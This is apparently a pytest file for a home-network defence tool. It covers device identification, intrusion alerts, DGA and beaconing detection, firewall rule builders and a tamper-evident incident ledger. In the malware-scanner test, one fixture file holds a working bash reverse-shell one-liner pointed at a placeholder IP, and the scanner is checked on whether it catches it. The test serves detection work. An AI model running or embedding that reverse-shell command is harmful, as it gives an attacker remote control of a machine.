import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "backend"))

from app.services.oui_db import is_locally_administered_mac, lookup_mac_vendor
from app.services.device_scanner import parse_ssdp_xml, resolve_device_identity
from app.services.ids_engine import LivePacketIDS, evaluate_baseline_and_passive_threats
from app.services.malware_scanner import EICAR_SIGNATURE, scan_file_bytes
from app.services.firewall_manager import build_block_ip_command
from app.services.advisor import build_security_advice
from app.services.ml_engine import BehavioralMLEngine, analyze_domain_dga, compute_beacon_regularity, shannon_entropy
from app.services.attestation_ledger import (
    compute_merkle_root,
    generate_merkle_proof,
    sha256_hex,
    signer,
    verify_merkle_proof,
)


def test_oui_and_randomized_mac():
    vendor, dtype, is_rand = lookup_mac_vendor("A4:83:E7:11:22:33")
    assert vendor == "Apple" and dtype == "laptop" and is_rand is False
    assert is_locally_administered_mac("DA:A1:19:44:55:66") is True
    vendor_r, _, is_rand2 = lookup_mac_vendor("DA:A1:19:44:55:66")
    assert is_rand2 is True and "Private" in vendor_r


def test_ssdp_xml_and_5_layer_name_resolution():
    sample_xml = """<?xml version="1.0"?>
    <root xmlns="urn:schemas-upnp-org:device-1-0">
      <device>
        <friendlyName>Living Room Sony Bravia 4K</friendlyName>
        <manufacturer>Sony Corporation</manufacturer>
        <modelName>KD-55X80K</modelName>
      </device>
    </root>"""
    fn, hint = parse_ssdp_xml(sample_xml)
    assert fn == "Living Room Sony Bravia 4K" and "Sony" in hint

    ident = resolve_device_identity(
        ip="192.168.1.33", mac="FC:0F:E6:00:11:22", is_gateway=False, is_self=False,
        mdns_map={}, ssdp_map={"192.168.1.33": (fn, hint)}, dhcp_map={},
    )
    assert ident["real_name"] == "Living Room Sony Bravia 4K" and ident["name_source"] == "ssdp"


def test_live_ids_arp_spoof_rogue_dhcp_and_syn_sweep():
    ids = LivePacketIDS()
    ids.update_network_context("192.168.1.14", "192.168.1.1", "70:85:C2:44:10:01")

    arp_alerts = ids.inspect_arp_event("192.168.1.1", "DE:AD:BE:9F:01:22", op=2, now=100.0)
    assert any(a["attack_type"] == "arp_spoof" and a["severity"] == "critical" for a in arp_alerts)

    dhcp_alerts = ids.inspect_dhcp_event(msg_type=2, src_ip="192.168.1.200", src_mac="DE:AD:BE:9F:01:22", hostname="AttackerBox")
    assert any(a["attack_type"] == "rogue_dhcp" for a in dhcp_alerts)
    assert ids.dhcp_hostnames["DE:AD:BE:9F:01:22"] == "AttackerBox"

    sweep_alerts = []
    for p in range(20, 34):
        sweep_alerts.extend(ids.inspect_tcp_syn("192.168.1.87", "192.168.1.14", p, now=200.0))
    assert any(a["attack_type"] == "port_sweep" and a["severity"] == "critical" for a in sweep_alerts)


def test_malware_eicar_and_revshell_detection():
    with tempfile.TemporaryDirectory() as td:
        eicar_path = Path(td) / "eicar_test.txt"
        eicar_path.write_bytes(EICAR_SIGNATURE)
        res1 = scan_file_bytes(eicar_path)
        assert len(res1) == 1 and res1[0]["category"] == "virus"

        sh_path = Path(td) / "update.sh"
        sh_path.write_text("#!/bin/sh\nbash -i >& /dev/tcp/198.51.100.10/4444 0>&1\n", encoding="utf-8")
        res2 = scan_file_bytes(sh_path)
        assert len(res2) == 1 and res2[0]["category"] == "reverse_shell"


def test_firewall_command_builders():
    rule_win, cmd_win = build_block_ip_command("192.168.1.87", "windows_netsh", unblock=False)
    assert rule_win == "GARUDA_BLOCK_192_168_1_87"
    assert "netsh" in cmd_win and "remoteip=192.168.1.87" in cmd_win
    _, cmd_ufw = build_block_ip_command("192.168.1.87", "linux_ufw", unblock=False)
    assert cmd_ufw[:4] == ["ufw", "insert", "1", "deny"]


def test_passive_open_wifi_and_unified_advisor():
    net = {
        "ssid": "Cafe_Free_WiFi", "gateway_ip": "10.0.0.1", "gateway_mac": "50:C7:BF:11:11:11",
        "encryption_grade": "None", "security_protocol": "Open (Unencrypted)",
        "is_public_or_untrusted": True, "vpn_active": False, "dns_servers": ["10.0.0.1"],
    }
    alerts = evaluate_baseline_and_passive_threats(net, [], known_safe_macs=set(), existing_macs=set())
    assert any(a["category"] == "passive_risk" and a["attack_type"] == "open_wifi" for a in alerts)
    adv = build_security_advice(
        net_info=net, devices=[], active_alerts=[{**a, "resolved": False} for a in alerts],
        malware_summary={"threats_found": 0}, firewall_status={"enabled": False},
        ml_summary={"network_anomaly_score": 78.0},
    )
    assert adv["safety_score"] < 50
    assert any(r["id"] == "inspect-ml-anomaly" for r in adv["recommendations"])


def test_ml_dga_entropy_and_beacon_regularity():
    benign = analyze_domain_dga("google.com")
    dga = analyze_domain_dga("x9k2qz7m4p1w8v3b9c4t.ru")
    assert benign["verdict"] == "benign" and benign["dga_probability"] < 0.35
    assert dga["verdict"] == "malicious_dga" and dga["dga_probability"] >= 0.72
    assert shannon_entropy("aaaa") == 0.0 and shannon_entropy("abcd") == 2.0

    # Strict 30-second periodic beacon vs human irregular browsing
    beacon_ts = [1000.0, 1030.0, 1060.2, 1090.1, 1120.0, 1150.1]
    human_ts = [1000.0, 1004.0, 1095.0, 1102.0, 1340.0, 1351.0]
    assert compute_beacon_regularity(beacon_ts) >= 0.9
    assert compute_beacon_regularity(human_ts) == 0.0


def test_ml_isolation_forest_ensemble_and_explainability():
    eng = BehavioralMLEngine()
    devices = [
        {"mac": "AA:BB:CC:11:22:33", "ip": "192.168.1.10", "real_name": "WorkLaptop", "display_name": "WorkLaptop", "vendor": "Apple", "name_source": "mdns", "is_safe": True, "is_online": True, "is_gateway": False, "is_self": True, "latency_ms": 4},
        {"mac": "DE:AD:BE:9F:01:22", "ip": "192.168.1.94", "real_name": "xk9q2z7m4p1w", "display_name": "xk9q2z7m4p1w", "vendor": "Unknown Manufacturer", "name_source": "dhcp", "is_safe": False, "is_online": True, "is_gateway": False, "is_self": False, "latency_ms": 180},
    ]
    eng.inject_simulated_anomaly("DE:AD:BE:9F:01:22", {"arp_burst_norm": 0.95, "beacon_regularity": 0.96, "dns_entropy_norm": 0.9})
    report = eng.evaluate_snapshot(devices, alerts=[], ids_stats={})
    scores = {s["mac"]: s for s in report["device_scores"]}
    assert scores["AA:BB:CC:11:22:33"]["anomaly_score"] < 35.0
    assert scores["DE:AD:BE:9F:01:22"]["anomaly_score"] >= 70.0
    assert scores["DE:AD:BE:9F:01:22"]["risk_level"] == "critical"
    assert len(scores["DE:AD:BE:9F:01:22"]["top_factors"]) >= 2

    fb = eng.reinforce_safe_device("DE:AD:BE:9F:01:22")
    assert fb["retrained"] is True


def test_merkle_tree_proofs_and_tamper_detection():
    leaves = [sha256_hex(f"incident-{i}".encode()) for i in range(5)]
    root = compute_merkle_root(leaves)
    for idx, leaf in enumerate(leaves):
        proof = generate_merkle_proof(leaves, idx)
        assert verify_merkle_proof(leaf, proof, root) is True
    # Tampering 1 byte in a leaf MUST fail Merkle inclusion verification
    bad_leaf = sha256_hex(b"incident-2-TAMPERED")
    assert verify_merkle_proof(bad_leaf, generate_merkle_proof(leaves, 2), root) is False


def test_ed25519_node_signer_roundtrip():
    msg = sha256_hex(b"garuda-v4-block-hash")
    sig = signer.sign(msg)
    assert signer.verify(msg, sig, signer.public_key_hex) is True
    assert signer.verify(sha256_hex(b"tampered-hash"), sig, signer.public_key_hex) is False


def test_solidity_contract_present_and_wellformed():
    sol = (ROOT / "contracts/GarudaAttestation.sol").read_text(encoding="utf-8")
    assert "contract GarudaAttestation" in sol
    assert "function anchorRoot(" in sol
    assert "function verifyIncident(" in sol
